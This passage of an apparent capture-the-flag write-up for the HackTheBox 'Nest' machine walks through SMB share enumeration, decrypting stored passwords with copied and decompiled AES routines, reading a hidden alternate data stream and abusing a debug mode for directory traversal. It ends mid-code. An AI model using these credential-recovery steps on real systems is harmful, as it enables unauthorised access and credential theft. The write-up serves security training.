+<span class=se>\I</span>T<span class=se>\C</span>arl<span class=se>\V</span>B Projects<span class=se>\W</span>IP<span class=se>\R</span>U<span class=se>\R</span>UScanner<span class=se>\b</span>in
+  .                                   D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:00:11 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:00:11 <span class=m>2019</span>
+  Debug                               D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:59:13 <span class=m>2019</span>
+  Release                             D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 14:55:26 <span class=m>2019</span>
+
+<span class=se>\I</span>T<span class=se>\C</span>arl<span class=se>\V</span>B Projects<span class=se>\W</span>IP<span class=se>\R</span>U<span class=se>\R</span>UScanner<span class=se>\M</span>y Project
+  .                                   D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:00:11 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:00:11 <span class=m>2019</span>
+  Application.Designer.vb             A      <span class=m>441</span>  Tue Aug  <span class=m>6</span> 14:55:13 <span class=m>2019</span>
+  Application.myapp                   A      <span class=m>481</span>  Tue Aug  <span class=m>6</span> 14:55:13 <span class=m>2019</span>
+  AssemblyInfo.vb                     A     <span class=m>1163</span>  Tue Aug  <span class=m>6</span> 14:55:13 <span class=m>2019</span>
+  Resources.Designer.vb               A     <span class=m>2776</span>  Tue Aug  <span class=m>6</span> 14:55:13 <span class=m>2019</span>
+  Resources.resx                      A     <span class=m>5612</span>  Tue Aug  <span class=m>6</span> 14:55:13 <span class=m>2019</span>
+  Settings.Designer.vb                A     <span class=m>2989</span>  Tue Aug  <span class=m>6</span> 14:55:13 <span class=m>2019</span>
+  Settings.settings                   A      <span class=m>279</span>  Tue Aug  <span class=m>6</span> 14:55:13 <span class=m>2019</span>
+
+<span class=o>[</span>... cut <span class=k>for</span> brevity ...<span class=o>]</span>
+</code></pre></div><p>It looks like Carl is working on a Visual Basic project named <em>RU Scanner</em>.</p>
+<h3 id=programming-in-vb>Programming in VB <a href=#programming-in-vb>¶</a></h3><p>We copy this whole directory structure locally so that we can have a look at the source code.<br>
+Perhaps we find what we need to decode the password we found in the config file?</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbget -rR <span class=s2>&#34;smb://10.10.10.178/Secure</span>$<span class=s2>/IT/Carl/VB Projects/WIP/RU&#34;</span> -U TempUser
+Password <span class=k>for</span> <span class=o>[</span>TempUser<span class=o>]</span> connecting to //Secure$/10.10.10.178: 
+Using workgroup WORKGROUP, user TempUser
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/ConfigFile.vb                            
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Module1.vb                               
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb       
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.myapp             
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb               
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb         
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.resx                
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb          
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.settings             
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                        
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user                   
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                        
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Utils.vb                                 
+smb://10.10.10.178/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner.sln                                      
+Downloaded 25,05kB in <span class=m>7</span> seconds
+</code></pre></div><p>You can open the <code>.vb</code> files one by one in a text editor or use an IDE like Visual Code to have a look at the source code.</p>
+<p>Eventually, we discover that <code>RUScanner/Utils.vb</code> contains the logic for encrypting and decrypthing passwords.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-vbnet data-lang=vbnet><span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>DecryptString</span><span class=p>(</span><span class=n>EncryptedString</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>)</span> <span class=ow>As</span> <span class=kt>String</span>
+    <span class=o>[</span><span class=p>...</span><span class=o>]</span>
+    <span class=k>Return</span> <span class=n>Decrypt</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>,</span> <span class=s>&#34;N3st22&#34;</span><span class=p>,</span> <span class=s>&#34;88552299&#34;</span><span class=p>,</span> <span class=n>2</span><span class=p>,</span> <span class=s>&#34;464R5DFA5DL6LE28&#34;</span><span class=p>,</span> <span class=n>256</span><span class=p>)</span>
+
+<span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>Decrypt</span><span class=p>(</span><span class=k>ByVal</span> <span class=n>cipherText</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+        <span class=k>ByVal</span> <span class=n>passPhrase</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+        <span class=k>ByVal</span> <span class=n>saltValue</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+        <span class=k>ByVal</span> <span class=n>passwordIterations</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>,</span> _
+        <span class=k>ByVal</span> <span class=n>initVector</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+        <span class=k>ByVal</span> <span class=n>keySize</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>)</span> _
+    <span class=ow>As</span> <span class=kt>String</span>
+    <span class=o>[</span><span class=p>...</span><span class=o>]</span>
+</code></pre></div><p>We can simply copy this code and run it against the encrypted password we found in the config file.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-vbnet data-lang=vbnet><span class=k>Imports</span> <span class=nn>System.Text</span>
+<span class=k>Imports</span> <span class=nn>System.Security.Cryptography</span>
+
+
+<span class=k>Public</span> <span class=k>Class</span> <span class=nc>Utils</span>
+
+    <span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>DecryptString</span><span class=p>(</span><span class=n>EncryptedString</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>)</span> <span class=ow>As</span> <span class=kt>String</span>
+        <span class=k>If</span> <span class=kt>String</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>)</span> <span class=k>Then</span>
+            <span class=k>Return</span> <span class=kt>String</span><span class=p>.</span><span class=n>Empty</span>
+        <span class=k>Else</span>
+            <span class=k>Return</span> <span class=n>Decrypt</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>,</span> <span class=s>&#34;N3st22&#34;</span><span class=p>,</span> <span class=s>&#34;88552299&#34;</span><span class=p>,</span> <span class=n>2</span><span class=p>,</span> <span class=s>&#34;464R5DFA5DL6LE28&#34;</span><span class=p>,</span> <span class=n>256</span><span class=p>)</span>
+        <span class=k>End</span> <span class=k>If</span>
+    <span class=k>End</span> <span class=k>Function</span>
+
+    <span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>Decrypt</span><span class=p>(</span><span class=k>ByVal</span> <span class=n>cipherText</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+                                   <span class=k>ByVal</span> <span class=n>passPhrase</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+                                   <span class=k>ByVal</span> <span class=n>saltValue</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+                                    <span class=k>ByVal</span> <span class=n>passwordIterations</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>,</span> _
+                                   <span class=k>ByVal</span> <span class=n>initVector</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
+                                   <span class=k>ByVal</span> <span class=n>keySize</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>)</span> _
+                           <span class=ow>As</span> <span class=kt>String</span>
+
+        <span class=k>Dim</span> <span class=n>initVectorBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
+        <span class=n>initVectorBytes</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>initVector</span><span class=p>)</span>
+
+        <span class=k>Dim</span> <span class=n>saltValueBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
+        <span class=n>saltValueBytes</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>saltValue</span><span class=p>)</span>
+
+        <span class=k>Dim</span> <span class=n>cipherTextBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
+                <span class=n>cipherTextBytes</span> <span class=o>=</span> <span class=n>System</span><span class=p>.</span><span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>cipherText</span><span class=p>)</span>
+
+        <span class=k>Dim</span> <span class=n>password</span> <span class=ow>As</span> <span class=k>New</span> <span class=n>Rfc2898DeriveBytes</span><span class=p>(</span><span class=n>passPhrase</span><span class=p>,</span> _
+                                           <span class=n>saltValueBytes</span><span class=p>,</span> _
+                                           <span class=n>passwordIterations</span><span class=p>)</span>
+
+        <span class=k>Dim</span> <span class=n>keyBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
+        <span class=n>keyBytes</span> <span class=o>=</span> <span class=n>password</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=k>CInt</span><span class=p>(</span><span class=n>keySize</span> <span class=o>/</span> <span class=n>8</span><span class=p>))</span>
+
+        <span class=k>Dim</span> <span class=n>symmetricKey</span> <span class=ow>As</span> <span class=k>New</span> <span class=n>AesCryptoServiceProvider</span>
+        <span class=n>symmetricKey</span><span class=p>.</span><span class=n>Mode</span> <span class=o>=</span> <span class=n>CipherMode</span><span class=p>.</span><span class=n>CBC</span>
+
+        <span class=k>Dim</span> <span class=n>decryptor</span> <span class=ow>As</span> <span class=n>ICryptoTransform</span>
+        <span class=n>decryptor</span> <span class=o>=</span> <span class=n>symmetricKey</span><span class=p>.</span><span class=n>CreateDecryptor</span><span class=p>(</span><span class=n>keyBytes</span><span class=p>,</span> <span class=n>initVectorBytes</span><span class=p>)</span>
+
+                <span class=k>Dim</span> <span class=n>memoryStream</span> <span class=ow>As</span> <span class=n>System</span><span class=p>.</span><span class=n>IO</span><span class=p>.</span><span class=n>MemoryStream</span>
+                <span class=n>memoryStream</span> <span class=o>=</span> <span class=k>New</span> <span class=n>System</span><span class=p>.</span><span class=n>IO</span><span class=p>.</span><span class=n>MemoryStream</span><span class=p>(</span><span class=n>cipherTextBytes</span><span class=p>)</span>
+
+        <span class=k>Dim</span> <span class=n>cryptoStream</span> <span class=ow>As</span> <span class=n>CryptoStream</span>
+        <span class=n>cryptoStream</span> <span class=o>=</span> <span class=k>New</span> <span class=n>CryptoStream</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>,</span> _
+                                        <span class=n>decryptor</span><span class=p>,</span> _
+                                        <span class=n>CryptoStreamMode</span><span class=p>.</span><span class=n>Read</span><span class=p>)</span>
+
+        <span class=k>Dim</span> <span class=n>plainTextBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
+        <span class=k>ReDim</span> <span class=n>plainTextBytes</span><span class=p>(</span><span class=n>cipherTextBytes</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
+
+        <span class=k>Dim</span> <span class=n>decryptedByteCount</span> <span class=ow>As</span> <span class=kt>Integer</span>
+        <span class=n>decryptedByteCount</span> <span class=o>=</span> <span class=n>cryptoStream</span><span class=p>.</span><span class=n>Read</span><span class=p>(</span><span class=n>plainTextBytes</span><span class=p>,</span> _
+                                               <span class=n>0</span><span class=p>,</span> _
+                                               <span class=n>plainTextBytes</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
+
+        <span class=n>memoryStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span>
+        <span class=n>cryptoStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span>
+
+        <span class=k>Dim</span> <span class=n>plainText</span> <span class=ow>As</span> <span class=kt>String</span>
+        <span class=n>plainText</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetString</span><span class=p>(</span><span class=n>plainTextBytes</span><span class=p>,</span> _
+                                            <span class=n>0</span><span class=p>,</span> _
+                                            <span class=n>decryptedByteCount</span><span class=p>)</span>
+
+        <span class=k>Return</span> <span class=n>plainText</span>
+    <span class=k>End</span> <span class=k>Function</span>
+
+        <span class=k>Sub</span> <span class=nf>Main</span><span class=p>()</span>
+                <span class=n>System</span><span class=p>.</span><span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>Utils</span><span class=p>.</span><span class=n>DecryptString</span><span class=p>(</span><span class=s>&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span><span class=p>))</span>
+        <span class=k>End</span> <span class=k>Sub</span>
+<span class=k>End</span> <span class=k>Class</span>
+</code></pre></div><p>We can use an online too like dotnetfiddle.net to run our code.</p>
+<p>This gives us the password <code>xRxRxPANCAK3SxRxRx</code></p>
+<h3 id=agent-smith>Agent Smith <a href=#agent-smith>¶</a></h3><p>Since this project was written by the user <code>c.smith</code>, we use this password to login as him/her on the box.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbclient -U c.smith <span class=se>\\\\</span>10.10.10.178<span class=se>\\</span>Users
+Unable to initialize messaging context
+Enter WORKGROUP<span class=se>\c</span>.smith<span class=err>&#39;</span>s password: <span class=c1># xRxRxPANCAK3SxRxRx</span>
+Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class=se>\&gt;</span> recurse on
+smb: <span class=se>\&gt;</span> ls
+  .                                   D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 00:04:21 <span class=m>2020</span>
+  ..                                  D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 00:04:21 <span class=m>2020</span>
+  Administrator                       D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 17:08:23 <span class=m>2019</span>
+  C.Smith                             D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 08:21:44 <span class=m>2020</span>
+  L.Frost                             D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 19:03:01 <span class=m>2019</span>
+  R.Thompson                          D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 19:02:50 <span class=m>2019</span>
+  TempUser                            D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:55:56 <span class=m>2019</span>
+
+<span class=se>\C</span>.Smith
+  .                                   D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 08:21:44 <span class=m>2020</span>
+  ..                                  D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 08:21:44 <span class=m>2020</span>
+  HQK Reporting                       D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 01:06:17 <span class=m>2019</span>
+  user.txt                            A       <span class=m>32</span>  Fri Aug  <span class=m>9</span> 01:05:24 <span class=m>2019</span>
+
+<span class=o>[</span>...<span class=o>]</span>
+
+<span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting
+  .                                   D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 01:06:17 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 01:06:17 <span class=m>2019</span>
+  AD Integration Module               D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 14:18:42 <span class=m>2019</span>
+  Debug Mode Password.txt             A        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 01:08:17 <span class=m>2019</span>
+  HQK_Config_Backup.xml               A      <span class=m>249</span>  Fri Aug  <span class=m>9</span> 01:09:05 <span class=m>2019</span>
+
+<span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\A</span>D Integration Module
+  .                                   D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 14:18:42 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 14:18:42 <span class=m>2019</span>
+  HqkLdap.exe                         A    <span class=m>17408</span>  Thu Aug  <span class=m>8</span> 01:41:16 <span class=m>2019</span>
+</code></pre></div><p>We find the user flag in C.Smith&rsquo;s home directory.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>smb: <span class=se>\&gt;</span> <span class=nb>cd</span> C.Smith<span class=se>\ </span>                                                                                     
+smb: <span class=se>\C</span>.Smith<span class=se>\&gt;</span> get user.txt        
+getting file <span class=se>\C</span>.Smith<span class=se>\u</span>ser.txt of size <span class=m>32</span> as user.txt <span class=o>(</span>0,3 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0,3 KiloBytes/sec<span class=o>)</span>
+
+$ cat user.txt 
+cf71b25404be5d84fd827e05f426e987
+</code></pre></div><h2 id=privesc>Privesc <a href=#privesc>¶</a></h2><h3 id=alternate-data-streams>Alternate Data Streams <a href=#alternate-data-streams>¶</a></h3><p>The <code>Debug Mode Password.txt</code> file looks interesting, but appears to be empty again.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>smb: <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\&gt;</span> get <span class=s2>&#34;Debug Mode Password.txt&#34;</span> 
+getting file <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\D</span>ebug Mode Password.txt of size <span class=m>0</span> as Debug Mode Password.txt <span class=o>(</span>0,0 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0,0 KiloBytes/sec<span class=o>)</span>
+</code></pre></div><p>However, this box was specifically built on Windows and rumour is its creator has hidden something using a technique specifically for Windows and NTFS: Alternate Data Strams (ADS).</p>
+<p>Looking at the <code>Debug Mode Password.txt</code> file again in more detail, we find something interesting.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>smb: <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\&gt;</span> allinfo <span class=s2>&#34;Debug Mode Password.txt&#34;</span>
+altname: DEBUGM~1.TXT
+create_time:    vr aug  <span class=m>9</span> 01:06:12 <span class=m>2019</span> CEST
+access_time:    vr aug  <span class=m>9</span> 01:06:12 <span class=m>2019</span> CEST
+write_time:     vr aug  <span class=m>9</span> 01:08:17 <span class=m>2019</span> CEST
+change_time:    vr aug  <span class=m>9</span> 01:08:17 <span class=m>2019</span> CEST
+attributes: A <span class=o>(</span>20<span class=o>)</span>
+stream: <span class=o>[</span>::<span class=nv>$DATA</span><span class=o>]</span>, <span class=m>0</span> bytes
+stream: <span class=o>[</span>:Password:<span class=nv>$DATA</span><span class=o>]</span>, <span class=m>15</span> bytes
+
+smb: <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\&gt;</span> get <span class=s2>&#34;Debug Mode Password.txt:Password:</span><span class=nv>$DATA</span><span class=s2>&#34;</span>
+getting file <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\D</span>ebug Mode Password.txt:Password:<span class=nv>$DATA</span> of size <span class=m>15</span> as Debug Mode Password.txt:Password:<span class=nv>$DATA</span> <span class=o>(</span>0,1 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0,9 KiloBytes/sec<span class=o>)</span>
+
+$ cat Debug<span class=se>\ </span>Mode<span class=se>\ </span>Password.txt<span class=se>\:</span>Password<span class=se>\:\$</span>DATA 
+WBQ201953D8w
+</code></pre></div><p>Note that you need to specifically add the stream to path using the <code>smb get</code> command, otherwise you&rsquo;ll just download the empty <code>::$DATA</code> stream.</p>
+<h3 id=hqk-reporting>HQK Reporting <a href=#hqk-reporting>¶</a></h3><p>This debug password is linked to the HQK Reporting tool.<br>
+Looking back at the output of our nmap scan, we had an unknown service running on port 4386 and it&rsquo;s banner mentioned <code>HQK Reporting Service</code>.</p>
+<p>Since we&rsquo;re working with a Windows box, we use telnet to connect to this service.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ telnet 10.10.10.178 <span class=m>4386</span>
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is <span class=s1>&#39;^]&#39;</span>.
+
+HQK Reporting Service V1.2
+
+&gt;help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR &lt;Directory_Name&gt;
+RUNQUERY &lt;Query_ID&gt;
+DEBUG &lt;Password&gt;
+HELP &lt;Command&gt;
+&gt;DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP <span class=nb>command</span> to view additional commands that are now available
+&gt;help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR &lt;Directory_Name&gt;
+RUNQUERY &lt;Query_ID&gt;
+DEBUG &lt;Password&gt;
+HELP &lt;Command&gt;
+SERVICE
+SESSION
+SHOWQUERY &lt;Query_ID&gt;
+
+Current Directory: ALL QUERIES
+</code></pre></div><p>We have successfully enabled the DEBUG mode and have been given additional commands to use.</p>
+<p>Testing the commands available to us, we discover that <code>LIST</code> isn&rsquo;t specifically listing reports but also directory listings.<br>
+We use this info to navigate around on the box, specifically the folder containing the HQK service and its config files.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>&gt;SETDIR ..
+
+Current directory <span class=nb>set</span> to HQK
+&gt;LIST
+
+Use the query ID numbers below with the RUNQUERY <span class=nb>command</span> and the directory names with the SETDIR <span class=nb>command</span>
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+<span class=o>[</span>DIR<span class=o>]</span>  ALL QUERIES
+<span class=o>[</span>DIR<span class=o>]</span>  LDAP
+<span class=o>[</span>DIR<span class=o>]</span>  Logs
+<span class=o>[</span>1<span class=o>]</span>   HqkSvc.exe
+<span class=o>[</span>2<span class=o>]</span>   HqkSvc.InstallState
+<span class=o>[</span>3<span class=o>]</span>   HQK_Config.xml
+
+Current Directory: HQK
+
+&gt;SETDIR LDAP
+
+Current directory <span class=nb>set</span> to LDAP
+&gt;LIST
+
+Use the query ID numbers below with the RUNQUERY <span class=nb>command</span> and the directory names with the SETDIR <span class=nb>command</span>
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+<span class=o>[</span>1<span class=o>]</span>   HqkLdap.exe
+<span class=o>[</span>2<span class=o>]</span>   Ldap.conf
+
+Current Directory: LDAP
+
+&gt;SHOWQUERY <span class=m>2</span>
+
+<span class=nv>Domain</span><span class=o>=</span>nest.local
+<span class=nv>Port</span><span class=o>=</span><span class=m>389</span>
+<span class=nv>BaseOu</span><span class=o>=</span><span class=nv>OU</span><span class=o>=</span>WBQ Users,OU<span class=o>=</span>Production,DC<span class=o>=</span>nest,DC<span class=o>=</span><span class=nb>local</span>
+<span class=nv>User</span><span class=o>=</span>Administrator
+<span class=nv>Password</span><span class=o>=</span>yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span class=o>=</span>
+</code></pre></div><p>We again find a password that appears to be encrypted/encoded.<br>
+Also, we discover that the tool appears to be making some kind of LDAP connection in the <code>WBQ Users.Production</code> Organizational Unit of the domain <code>nest.local</code>.</p>
+<h3 id=ilspy>ILSpy <a href=#ilspy>¶</a></h3><p>Taking a step back and returning to our SMB access, we download the <code>HqkLdap.exe</code> executable.</p>
+<p>Similar to how we got the previous password decoded, we could try to find the encoding/decoding section of this executable to try and decrypt the password we found.<br>
+However, this time we don&rsquo;t have the source code, so we&rsquo;ll need to reverse engineer the executable.</p>
+<p>That&rsquo;s where ILSpy comes in.<br>
+You can install this add-on in Visual Studio Code (a free IDE similar to Visual Studio) via the Marketplace.</p>
+<p>Once you&rsquo;ve installed the add-on, press <code>Ctrl + Shift + P</code>, select <code>ILSpy: Decompile IM Assembly (pick file)</code> and open <code>HqkLdap.exe</code>.</p>
+<figure class=center>
+<img src=https://sequr.be/img/htb-nest-ilspy.png>
+<figcaption class=center>ILSpy</figcaption>
+</figure>
+<p>In here, we find the encryption module in <code>/HqkLdap/CR</code>.<br>
+We again extract this code and write our own script that will decode our password.<br>
+dotnetfiddle.net again comes to the rescue for executing our code.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-vbnet data-lang=vbnet><span class=k>using</span> <span class=n>System</span><span class=err>;</span>
+<span class=k>using</span> <span class=n>System</span><span class=p>.</span><span class=n>IO</span><span class=err>;</span>
+<span class=k>using</span> <span class=n>System</span><span class=p>.</span><span class=n>Security</span><span class=p>.</span><span class=n>Cryptography</span><span class=err>;</span>
+<span class=k>using</span> <span class=n>System</span><span class=p>.</span><span class=n>Text</span><span class=err>;</span>
+
+<span class=k>namespace</span> <span class=nn>HqkLdap</span>
+<span class=p>{</span>
+	<span class=k>public</span> <span class=k>class</span> <span class=nc>CR</span>
+	<span class=p>{</span>
+		<span class=k>private</span> <span class=k>const</span> <span class=kt>string</span> <span class=n>K</span> <span class=o>=</span> <span class=s>&#34;667912&#34;</span><span class=err>;</span>
+		<span class=k>private</span> <span class=k>const</span> <span class=kt>string</span> <span class=n>I</span> <span class=o>=</span> <span class=s>&#34;1L1SA61493DRV53Z&#34;</span><span class=err>;</span>
+		<span class=k>private</span> <span class=k>const</span> <span class=kt>string</span> <span class=n>SA</span> <span class=o>=</span> <span class=s>&#34;1313Rf99&#34;</span><span class=err>;</span>
+
+		<span class=k>public</span> <span class=k>static</span> <span class=kt>string</span> <span class=n>DS</span><span class=p>(</span><span class=kt>string</span> <span class=n>EncryptedString</span><span class=p>)</span>
+		<span class=p>{</span>
+			<span class=k>if</span> <span class=p>(</span><span class=kt>string</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>))</span>
+			<span class=p>{</span>
+				<span class=k>return</span> <span class=kt>string</span><span class=p>.</span><span class=n>Empty</span><span class=err>;</span>
+			<span class=p>}</span>
+			<span class=k>return</span> <span class=n>RD</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>,</span> <span class=n>K</span><span class=p>,</span> <span class=n>SA</span><span class=p>,</span> <span class=n>3</span><span class=p>,</span> <span class=n>I</span><span class=p>,</span> <span class=n>256</span><span class=p>)</span><span class=err>;</span>
+		<span class=p>}</span>
+
+		<span class=k>private</span> <span class=k>static</span> <span class=kt>string</span> <span class=n>RD</span><span class=p>(</span><span class=kt>string</span> <span class=n>cipherText</span><span class=p>,</span> <span class=kt>string</span> <span class=n>passPhrase</span><span class=p>,</span> <span class=kt>string</span> <span class=n>saltValue</span><span class=p>,</span> <span class=n>int</span> <span class=n>passwordIterations</span><span class=p>,</span> <span class=kt>string</span> <span class=n>initVector</span><span class=p>,</span> <span class=n>int</span> <span class=n>keySize</span><span class=p>)</span>
+		<span class=p>{</span>
+			<span class=kt>byte</span><span class=o>[]</span> <span class=n>bytes</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>initVector</span><span class=p>)</span><span class=err>;</span>
+			<span class=kt>byte</span><span class=o>[]</span> <span class=n>bytes2</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>saltValue</span><span class=p>)</span><span class=err>;</span>
+			<span class=kt>byte</span><span class=o>[]</span> <span class=n>array</span> <span class=o>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>cipherText</span><span class=p>)</span><span class=err>;</span>
+			<span class=n>Rfc2898DeriveBytes</span> <span class=n>rfc2898DeriveBytes</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Rfc2898DeriveBytes</span><span class=p>(</span><span class=n>passPhrase</span><span class=p>,</span> <span class=n>bytes2</span><span class=p>,</span> <span class=n>passwordIterations</span><span class=p>)</span><span class=err>;</span>
+			<span class=n>checked</span>
+			<span class=p>{</span>
+				<span class=kt>byte</span><span class=o>[]</span> <span class=n>bytes3</span> <span class=o>=</span> <span class=n>rfc2898DeriveBytes</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>((</span><span class=n>int</span><span class=p>)</span><span class=n>Math</span><span class=p>.</span><span class=n>Round</span><span class=p>((</span><span class=kt>double</span><span class=p>)</span><span class=n>keySize</span> <span class=o>/</span> <span class=n>8</span><span class=p>.</span><span class=n>0</span><span class=p>))</span><span class=err>;</span>
+				<span class=n>AesCryptoServiceProvider</span> <span class=n>aesCryptoServiceProvider</span> <span class=o>=</span> <span class=k>new</span> <span class=n>AesCryptoServiceProvider</span><span class=p>()</span><span class=err>;</span>
